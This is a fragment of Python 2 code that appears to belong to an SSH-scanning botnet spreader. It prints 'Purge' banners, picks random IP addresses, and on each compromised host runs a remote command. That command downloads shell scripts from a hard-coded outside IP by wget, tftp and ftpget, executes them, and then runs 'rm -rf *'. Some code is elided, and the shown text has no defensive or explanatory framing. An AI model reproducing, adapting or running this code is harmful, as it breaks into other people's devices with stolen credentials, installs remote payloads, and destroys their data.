...
print "\x1b[31mPurge Has Been Executed..."
print "\x1b[31mPurge Is Activating"
time.sleep(1)
print "\x1b[31mPurge Has Been Activated"
        ...
        while 1:
			...
			self.host = random.choice(lucky22)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                ...
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[31mExecuting Bins On~>\x1b[32m '+self.host+'|'+username+'|'+password+'|'+str(port)
			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.63.74.39/Plex-Script.sh; chmod 777 Plex-Script.sh; sh Plex-Script.sh; tftp 45.63.74.39 -c get Plex-Script-2.sh; chmod 777 Plex-Script-2.sh; sh Plex-Script-2.sh; tftp -r Plex-Script-3.sh -g 45.63.74.39; chmod 777 Plex-Script-3.sh; sh Plex-Script-3.sh; ftpget -v -u anonymous -p anonymous -P 21 45.63.74.39 Plex-Script-4.sh Plex-Script-4.sh; sh Plex-Script-4.sh; rm -rf Plex-Script.sh Plex-Script-2.sh Plex-Script-3.sh Plex-Script-4.sh; rm -rf *")
